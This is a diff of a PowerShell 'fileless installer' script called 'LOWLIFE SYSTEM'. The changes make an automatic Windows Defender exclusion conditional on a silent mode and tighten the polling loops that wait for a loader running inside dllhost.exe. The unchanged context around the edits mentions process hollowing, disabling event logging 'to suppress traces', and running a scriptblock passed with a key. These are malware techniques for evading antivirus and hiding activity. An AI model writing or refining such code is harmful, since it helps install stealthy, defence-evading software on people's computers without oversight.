@@ -49,22 +49,26 @@ Write-Host "   LOWLIFE SYSTEM - FILELESS INSTALLER    " -ForegroundColor Cyan
 Write-Host "==========================================" -ForegroundColor Cyan
 
 # Automatically add Windows Defender exclusion for workspace to prevent hollowing blockages
-Write-Host "Configuring Windows Security exclusions..." -ForegroundColor Yellow
-try {
-    $exclusionTarget = if ($actualWorkspace) { $actualWorkspace } else { $scriptRoot }
-    if (-not [string]::IsNullOrWhiteSpace($exclusionTarget)) {
-        $exclusionPath = Split-Path -Parent $exclusionTarget -ErrorAction SilentlyContinue
-        if (-not [string]::IsNullOrWhiteSpace($exclusionPath)) {
-            Add-MpPreference -ExclusionPath $exclusionPath -ErrorAction SilentlyContinue
-            Write-Host "    Workspace path successfully whitelisted in Windows Defender." -ForegroundColor Green
+if (-not $Silent) {
+    Write-Host "Configuring Windows Security exclusions..." -ForegroundColor Yellow
+    try {
+        $exclusionTarget = if ($actualWorkspace) { $actualWorkspace } else { $scriptRoot }
+        if (-not [string]::IsNullOrWhiteSpace($exclusionTarget)) {
+            $exclusionPath = Split-Path -Parent $exclusionTarget -ErrorAction SilentlyContinue
+            if (-not [string]::IsNullOrWhiteSpace($exclusionPath)) {
+                Add-MpPreference -ExclusionPath $exclusionPath -ErrorAction SilentlyContinue
+                Write-Host "    Workspace path successfully whitelisted in Windows Defender." -ForegroundColor Green
+            } else {
+                Write-Host "    WARNING: Workspace is at a root path; skipping Defender exclusion." -ForegroundColor Yellow
+            }
         } else {
-            Write-Host "    WARNING: Workspace is at a root path; skipping Defender exclusion." -ForegroundColor Yellow
+            Write-Host "    WARNING: Script root path is empty; skipping Defender exclusion." -ForegroundColor Yellow
         }
-    } else {
-        Write-Host "    WARNING: Script root path is empty; skipping Defender exclusion." -ForegroundColor Yellow
+    } catch {
+        Write-Host "    WARNING: Could not automatically set Defender exclusions." -ForegroundColor Yellow
     }
-} catch {
-    Write-Host "    WARNING: Could not automatically set Defender exclusions." -ForegroundColor Yellow
+} else {
+    Write-Host "    Silent mode: skipping Windows Security exclusion configuration."
 }
 
 # Disable event logging during install to suppress traces
@@ -477,13 +481,13 @@ $started = $false
 if ($hollowSuccess) {
     Write-Host "    Loader running inside dllhost.exe. Waiting to verify initialization..." -ForegroundColor Green
     # Check if port 9876 comes up
-    for ($i = 0; $i -lt 5; $i++) {
+    for ($i = 0; $i -lt 100; $i++) {
         try {
             $c = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 9876)
             $c.Close()
             $started = $true
             break
-        } catch { Start-Sleep -Seconds 1 }
+        } catch { Start-Sleep -Milliseconds 50 }
     }
 }
 
@@ -595,13 +599,13 @@ if(`$s){. ([scriptblock]::Create(`$s)) -Silent -Key `$k;break}
 # -- Wait for loader to come up and open portal ---------------------------------
 Write-Host "Waiting for loader to initialize on port 9876..." -ForegroundColor Yellow
 $started = $false
-for ($i = 0; $i -lt 20; $i++) {
+for ($i = 0; $i -lt 200; $i++) {
     try {
         $c = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 9876)
         $c.Close()
         $started = $true
         break
-    } catch { Start-Sleep -Seconds 1 }
+    } catch { Start-Sleep -Milliseconds 50 }
 }
 
 if ($started) {
